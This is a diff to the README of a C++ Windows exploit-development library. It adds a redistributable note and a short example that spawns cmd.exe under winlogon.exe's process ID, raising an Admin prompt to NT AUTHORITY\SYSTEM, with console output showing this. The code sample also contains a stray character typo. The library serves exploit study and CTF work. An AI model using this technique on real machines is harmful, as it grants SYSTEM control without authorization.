@@ -7,6 +7,8 @@ The idea is to provide in C on Windows the same kind of functionalities than [pw
 
 ## Examples
 
+PS: you might need [vc_redist_x64](https://aka.ms/vs/16/release/vc_redist.x64.exe) and/or [vc_redist_x86](https://aka.ms/vs/16/release/vc_redist.x86.exe]
+
 Very small samples of what the library offers:
 
 ### Start
@@ -124,4 +126,38 @@ Outputs
 0000   48 31 C0 48 FF C0 90 C3                           |  H1.H....
 ```
 
-#### todo: finish
+### Process
+
+#### Process creation from specific parent
+
+Cheap way to spawn a `NT AUTHORITY\SYSTEM` process from Admin prompt
+
+```cpp
+#include <pwn++\pwn.h>
+int wmain()
+{
+	HANDLE hProcess;B
+	auto ppid = pwn::system::pidof(L"winlogon.exe");
+	info(L"found winlogon pid=%lu\n", ppid);
+	pwn::process::execv(L"cmd.exe", ppid, &hProcess);
+	::CloseHandle(hProcess);
+	return 0;
+}
+```
+
+
+Outputs
+```
+REM In Prompt
+PS C:\> whoami
+win10-wilhelm\chris
+PS C:\> .\pwn++-tests.exe
+[DEBUG]  log_level set to 0
+[*]  found winlogon pid=684
+[DEBUG]  Spawning 'cmd.exe' with PPID=684...
+[DEBUG]  'cmd.exe' spawned with PID 2024
+
+REM New prompt appears
+C:\Windows\System32>whoami
+nt authority\system
+```
